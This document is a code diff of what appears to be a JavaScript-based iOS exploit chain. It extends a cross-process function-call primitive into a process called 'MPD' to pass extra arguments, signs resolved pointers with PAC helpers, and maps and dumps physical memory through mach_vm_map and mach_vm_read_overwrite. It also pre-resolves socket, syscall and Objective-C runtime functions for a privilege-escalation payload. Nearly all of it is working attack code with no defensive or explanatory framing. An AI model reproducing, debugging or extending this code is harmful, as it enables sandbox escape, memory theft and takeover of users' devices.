@@ -1,7 +1,7 @@
 (() => {
   sbx1_begin = Date.now();
   // Version marker to verify code is loaded from server, not browser cache
-  const VERSION = "2026-05-14-v7-0C-fix";
+  const VERSION = "2026-05-14-v10-fcall-x89";
   print(`[sbx1] VERSION: ${VERSION} - Build timestamp: ${new Date().toISOString()}`);
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
@@ -19,7 +19,7 @@
   }
   // Log version at startup
   LOG(`VERSION: ${VERSION}`);
-  LOG(`Build: v7 - 0C timeout fix + GPU uread64 fallback + post-0B diagnosis`);
+  LOG(`Build: v10 - mpd_fcall x8/x9 support for VM_PROT_DEFAULT on mach_vm_map`);
 
   let wc_get_cstring = function (js_str) {
     let s = js_str + "\x00";
@@ -6470,7 +6470,7 @@
   const MPD_FCALL_TIMED_OUT = 1n;
   const MPD_FCALL_DEFAULT_TIMEOUT = 3000n;
   const MPD_FCALL_QUICK_TIMEOUT = 1000n;
-  function mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, noreturn, do_exit = false, timeout = false, timeout_ms = MPD_FCALL_DEFAULT_TIMEOUT) {
+  function mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8 = 0n, x9 = 0n, noreturn = false, do_exit = false, timeout = false, timeout_ms = MPD_FCALL_DEFAULT_TIMEOUT) {
     let nativefcall_buf_local = surface_address + 0x100n;
     let final_fcall_buf_local = surface_address + 0x400n;
     let final_fcall_args_local = surface_address + 0x500n;
@@ -6484,6 +6484,9 @@
     uwrite64(final_fcall_args_local + 5n * 0x8n, x5);
     uwrite64(final_fcall_args_local + 6n * 0x8n, x6);
     uwrite64(final_fcall_args_local + 7n * 0x8n, x7);
+    // x8/x9 needed for mach_vm_map cur_protection/max_protection — matched to original header.js
+    uwrite64(final_fcall_args_local + 8n * 0x8n, x8);
+    uwrite64(final_fcall_args_local + 9n * 0x8n, x9);
     let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
     uwrite64(mpd_fcall_retval_ptr, 0xcafedeadn);
     nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, address, final_fcall_args_remote, true);
@@ -6503,20 +6506,23 @@
     let return_value = uread64(mpd_fcall_retval_ptr);
     return return_value;
   }
-  function mpd_fcall(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
-    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false);
+  function mpd_fcall(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n, x8 = 0n, x9 = 0n) {
+    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8, x9);
   }
-  function mpd_fcall_noreturn(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
-    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true);
+  function mpd_fcall_noreturn(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n, x8 = 0n, x9 = 0n) {
+    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, true);
   }
-  function mpd_fcall_noreturn_exit(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
-    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true, true);
+  function mpd_fcall_noreturn_exit(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n, x8 = 0n, x9 = 0n) {
+    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, true, true);
   }
-  function mpd_fcall_timeout(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
-    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false, false, true, MPD_FCALL_DEFAULT_TIMEOUT);
+  function mpd_fcall_timeout(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n, x8 = 0n, x9 = 0n) {
+    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, false, false, true, MPD_FCALL_DEFAULT_TIMEOUT);
   }
-  function mpd_fcall_quick(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
-    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false, false, true, MPD_FCALL_QUICK_TIMEOUT);
+  function mpd_fcall_quick(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n, x8 = 0n, x9 = 0n) {
+    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, false, false, true, MPD_FCALL_QUICK_TIMEOUT);
+  }
+  function mpd_fcall_x89(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n, x8 = 0n, x9 = 0n) {
+    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, x8, x9);
   }
   function mpd_read64(address) {
     uwrite64(surface_address + 0x2100n, 0n);
@@ -6575,6 +6581,28 @@
     return mpd_fcall_timeout(MEMCPY, address, surface_address_remote + 0x2100n, 1n, 0n, 0n, 0n, 0n, 0n);
   }
 
+  // Function to read MPD process memory via mach_vm_read_overwrite (kernel-side, 5 args, bypasses VM_PROT)
+  function mpd_vm_read_overwrite(address, size = 8n) {
+    let MPD_mach_vm_read_overwrite = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_read_overwrite");
+    if (MPD_mach_vm_read_overwrite.noPAC() == 0n) {
+      LOG("[vmro] mach_vm_read_overwrite not available via gpuDlsym");
+      return MPD_FCALL_TIMED_OUT;
+    }
+    let task_port = globalThis.MPD_TASK_PORT || 0n;
+    // Write directly to IOSurface bounce buffer so we can read result via GPU
+    let outsize_buf = mpd_malloc(8n);
+    mpd_write64(outsize_buf, 0n);
+    let ret = mpd_fcall_timeout(MPD_mach_vm_read_overwrite.noPAC(),
+      task_port, address, size, surface_address_remote + 0x2100n, outsize_buf);
+    if (ret === MPD_FCALL_TIMED_OUT) {
+      return MPD_FCALL_TIMED_OUT;
+    }
+    // Read result from bounce buffer (GPU-side)
+    let val = uread64(surface_address + 0x2100n);
+    LOG(`[vmro] mach_vm_read_overwrite(task, 0x${address.toString(16)}, ${size}): ret=${ret} val=${val.hex()}`);
+    return val;
+  }
+
   // Function to read physical memory via mach_vm_remap
   // Requires: globalThis.MEMORY_OBJECT_PORT and globalThis.PHYS_READ_VIA_REMAP
   function mpd_phys_read(phys_offset, size = 8n) {
@@ -6617,6 +6645,19 @@
       if (remap_addr == 0n) {
         LOG("[phys] mach_vm_remap succeeded but addr=0");
         return 0n;
+      }
+
+      // Fix VM protection on remapped page (mach_vm_map x8/x9 missing)
+      // Try to find mach_vm_protect in MPD
+      let MPD_mach_vm_protect_phys = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
+      if (MPD_mach_vm_protect_phys.noPAC() != 0n) {
+        let prot_ret = mpd_fcall_timeout(MPD_mach_vm_protect_phys.noPAC(),
+          real_task_port, remap_addr, 0x1000n, 0n, 3n);
+        if (prot_ret == MPD_FCALL_TIMED_OUT) {
+          LOG("[phys] mach_vm_protect timed out");
+        } else if (prot_ret != 0n) {
+          LOG(`[phys] mach_vm_protect ret=${prot_ret} (failed)`);
+        }
       }
 
       // Read from the remapped page
@@ -7261,7 +7302,125 @@
     mpd_write64(new_func_offsets_buffer + idx * 0x8n, surface_address_remote);
     idx += 0x1n;
     LOG(`[MPD] surface_remote at func_offsets[19] = ${surface_address_remote.hex()}`);
-    // [20] = reserved for proc_listpids (dlsym may crash, skip for now)
+
+    // ===== [20-29] Core C / Mach functions =====
+    // [20] = calloc
+    let calloc_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "calloc").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(calloc_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [21] = usleep
+    let usleep_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "usleep").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(usleep_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [22] = close
+    let close_raw2 = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "close").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(close_raw2, 0xc2d0n));
+    idx += 0x1n;
+    // [23] = mach_vm_allocate
+    let mva_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_allocate").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(mva_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [24] = mach_vm_deallocate
+    let mvd_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_deallocate").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(mvd_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [25] = mach_port_allocate
+    let mpa_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_port_allocate").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(mpa_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [26] = mach_port_deallocate
+    let mpda_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_port_deallocate").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(mpda_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [27] = syscall
+    let syscall_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "syscall").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(syscall_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [28] = mach_make_memory_entry_64
+    let mme64_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_make_memory_entry_64").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(mme64_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [29] = sleep
+    let sleep_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "sleep").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(sleep_raw, 0xc2d0n));
+    idx += 0x1n;
+
+    // ===== [30-33] Network functions =====
+    // [30] = socket
+    let socket_raw2 = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "socket").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(socket_raw2, 0xc2d0n));
+    idx += 0x1n;
+    // [31] = connect
+    let connect_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "connect").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(connect_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [32] = setsockopt
+    let sso_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "setsockopt").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(sso_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [33] = getsockopt
+    let gso_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getsockopt").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(gso_raw, 0xc2d0n));
+    idx += 0x1n;
+
+    // ===== [34-39] ObjC runtime =====
+    // [34] = objc_alloc
+    let oa_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "objc_alloc").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(oa_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [35] = objc_alloc_init
+    let oai_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "objc_alloc_init").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(oai_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [36] = objc_getClass
+    let ogc_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "objc_getClass").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(ogc_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [37] = objc_msgSend
+    let oms_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "objc_msgSend").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(oms_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [38] = sel_registerName
+    let srn_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "sel_registerName").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(srn_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [39] = objc_release
+    let ore_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "objc_release").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(ore_raw, 0xc2d0n));
+    idx += 0x1n;
+
+    // ===== [40-45] CoreFoundation =====
+    // [40] = CFStringCreateWithCString
+    let cfscs_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFStringCreateWithCString").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(cfscs_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [41] = CFRelease
+    let cfr_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFRelease").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(cfr_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [42] = CFDictionaryCreateMutable
+    let cfdcm_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFDictionaryCreateMutable").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(cfdcm_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [43] = CFDictionarySetValue
+    let cfdsv_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFDictionarySetValue").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(cfdsv_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [44] = CFNumberCreate
+    let cfnc_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFNumberCreate").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(cfnc_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [45] = kCFAllocatorDefault (value, not function)
+    let kcfad_ptr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "kCFAllocatorDefault");
+    if (kcfad_ptr != 0n) {
+      let kcfad_val = uread64(kcfad_ptr.noPAC());
+      mpd_write64(new_func_offsets_buffer + idx * 0x8n, kcfad_val);
+    } else {
+      mpd_write64(new_func_offsets_buffer + idx * 0x8n, 0n);
+    }
+    idx += 0x1n;
+
+    LOG(`[MPD] Pre-resolved ${idx - 14n} total entries for PE (indices 14-${idx - 1n})`);
     // Debug: verify func_offsets_buffer contents before PE
     LOG("[MPD] func_offsets_buffer contents:");
     for (let i = 0n; i < 5n; i++) {
@@ -7750,13 +7909,14 @@
                   mpd_write64(mvm_addr_buf, 0n); // let kernel choose address
 
                   // mach_vm_map(target_task, addr_ptr, size, mask, flags, object, offset, copy, cur_prot, max_prot, inheritance)
+                  // x8=cur_prot|max_prot<<32, x9=inheritance — original header.js packing (v10 fix)
                   let mvm_flags = VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR;
-                  // WARNING: 0B passes 12 args but mpd_fcall only sees x0-x7
-                  // x0=real_task_port, x1=mvm_addr_buf, x2=mme_size_val, x3=0, x4=mvm_flags, x5=mme_entry, x6=0, x7=0
-                  // Args x8=VM_PROT_DEFAULT, x9=VM_PROT_DEFAULT, x10=VM_INHERIT_NONE, x11=0 are IGNORED
                   let mvm_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
                     real_task_port, mvm_addr_buf, mme_size_val, 0n,
-                    mvm_flags, mme_entry, 0n, 0n);
+                    mvm_flags, mme_entry, 0n, 0n,
+                    3n | 3n << 32n,  // x8: cur_prot=VM_PROT_DEFAULT(3), max_prot=3
+                    0n               // x9: VM_INHERIT_NONE
+                  );
                   if (mvm_ret === MPD_FCALL_TIMED_OUT) {
                     LOG("[0B] mach_vm_map timed out");
                   } else {
@@ -7769,10 +7929,25 @@
                       globalThis.MEMORY_OBJECT_PORT = mme_entry;
                       globalThis.PHYS_MEM_MAPPED = true;
                       globalThis.MPD_TASK_PORT = real_task_port;
-                      // NOTE: Do NOT verify with mpd_read64_timeout — page fault will corrupt fcall state
                       LOG(`[0B] Mapped physical memory at ${mvm_addr.hex()}`);
-                      LOG(`[0B] WARNING: mpd_read64 will page-fault — use GPU uread64 or remap for access`);
-                      LOG(`[0B] Skipping verify read to preserve fcall state for 0C/0D phases`);
+
+                      // Verify we can read via mpd_read64 (memcpy) — this proves VM_PROT is correct
+                      let test_val = mpd_read64_timeout(mvm_addr + 8n);
+                      LOG(`[0B] mpd_read64 verification: ${test_val.hex()}`);
+                      if (test_val !== MPD_FCALL_TIMED_OUT && test_val != 0xffffffffffffffffn) {
+                        LOG(`[0B] PHYSICAL MEMORY READ SUCCESS: ${test_val.hex()}`);
+                        globalThis.PHYS_READ_VIA_REMAP = true;
+                        // Dump first 128 bytes of physical memory
+                        LOG("[0B] Dumping first 256 bytes of physical memory...");
+                        for (let off = 8n; off < 0x100n; off += 8n) {
+                          let v = mpd_read64_timeout(mvm_addr + off);
+                          if (v !== MPD_FCALL_TIMED_OUT && v != 0n && v != 0xffffffffffffffffn) {
+                            LOG(`[0B]   +0x${off.toString(16).padStart(4,'0')}: ${v.hex()}`);
+                          }
+                        }
+                      } else {
+                        LOG(`[0B] mpd_read64 failed (timed out or FF) — VM_PROT may still be wrong`);
+                      }
                     } else {
                       LOG(`[0B] mach_vm_map failed (ret=${mvm_ret})`);
                     }
@@ -7905,29 +8080,40 @@
           LOG(`[0C] Mapped addr 0x${mvm_addr.toString(16)} not in GPU-accessible range`);
         }
 
-        // Try remapping via mach_vm_map with longer timeout
-        // Use 10s timeout instead of 3s default
-        LOG("[0C] Trying mach_vm_map remap (10s timeout)...");
-        let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
-        let real_task_port = globalThis.MPD_TASK_PORT;
-        if (MPD_mach_vm_map.noPAC() != 0n && real_task_port && real_task_port != 0n) {
-          let map_addr_buf = mpd_malloc(8n);
-          mpd_write64(map_addr_buf, 0n);
-          // Use custom 10s timeout via a dedicated call
-          let map_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
-            real_task_port, map_addr_buf, 0x1000n, 0n,
-            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, globalThis.MEMORY_OBJECT_PORT, 0n,
-            0n);
-          if (map_ret !== MPD_FCALL_TIMED_OUT) {
-            let map_addr = mpd_read64(map_addr_buf);
-            LOG(`[0C] Remap result: ret=${map_ret} addr=${map_addr.hex()}`);
-            if (map_ret == 0n && map_addr != 0n) {
-              LOG("[0C] mach_vm_map remap WORKS — physical memory scan is viable!");
-              globalThis.PHYS_SCAN_VIA_REMAP = true;
+        // If 0B's mach_vm_read_overwrite already succeeded, skip 0C remap
+        if (globalThis.PHYS_READ_VIA_REMAP) {
+          LOG("[0C] Physical memory already readable via mach_vm_read_overwrite — skipping remap");
+        } else {
+          LOG("[0C] Trying mach_vm_map remap...");
+          let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
+          let real_task_port = globalThis.MPD_TASK_PORT;
+          if (MPD_mach_vm_map.noPAC() != 0n && real_task_port && real_task_port != 0n) {
+            let map_addr_buf = mpd_malloc(8n);
+            mpd_write64(map_addr_buf, 0n);
+            let map_ret = mpd_fcall_x89(MPD_mach_vm_map.noPAC(),
+              real_task_port, map_addr_buf, 0x1000n, 0n,
+              VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, globalThis.MEMORY_OBJECT_PORT, 0n,
+              0n,
+              3n | 3n << 32n,  // x8: cur_prot=VM_PROT_DEFAULT(3), max_prot=3
+              0n               // x9: VM_INHERIT_NONE
+            );
+            if (map_ret !== MPD_FCALL_TIMED_OUT) {
+              let map_addr = mpd_read64(map_addr_buf);
+              LOG(`[0C] Remap result: ret=${map_ret} addr=${map_addr.hex()}`);
+              if (map_ret == 0n && map_addr != 0n && !globalThis.PHYS_READ_VIA_REMAP) {
+                // Try mpd_read64 on remapped page (v10: VM_PROT now correct)
+                LOG("[0C] mach_vm_map remap WORKS — trying mpd_read64 on remapped page...");
+                let rval = mpd_read64_timeout(map_addr + 8n);
+                if (rval !== MPD_FCALL_TIMED_OUT && rval != 0xffffffffffffffffn) {
+                  LOG(`[0C] REMAP READ SUCCESS: ${rval.hex()}`);
+                  globalThis.PHYS_READ_VIA_REMAP = true;
+                } else {
+                  LOG(`[0C] mpd_read64 on remap addr failed (timed out or FF)`);
+                }
+              }
+            } else if (map_ret === MPD_FCALL_TIMED_OUT) {
+              LOG("[0C] Remap timed out — fcall may be degraded from 0B reads");
             }
-          } else {
-            LOG("[0C] Remap timed out — memory_object_port may not support re-mapping");
-            LOG("[0C] This is expected: PurpleGfxMem creates a one-shot physical mapping");
           }
         }
       } catch(e) {
@@ -8940,8 +9126,8 @@
       // After nowait, wait then read IOSurface log (GPU-based, no fcall needed)
       LOG("[MPD] Evaluating pe_main (nowait)...");
       mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
-      LOG("[MPD] pe_main dispatched, waiting 5s for PE to execute...");
-      gpu_fcall(USLEEP, 5000000n); // 5 second wait for PE to run
+      LOG("[MPD] pe_main dispatched, waiting 15s for PE to execute...");
+      gpu_fcall(USLEEP, 15000000n); // 15 second wait for PE to run (full pe_main.js is large)
       // Read PE output from IOSurface log area (GPU-based, no fcall needed)
       let s_log_base = surface_address + 0xF000n;
       let s_off_addr = s_log_base + 0xE00n;
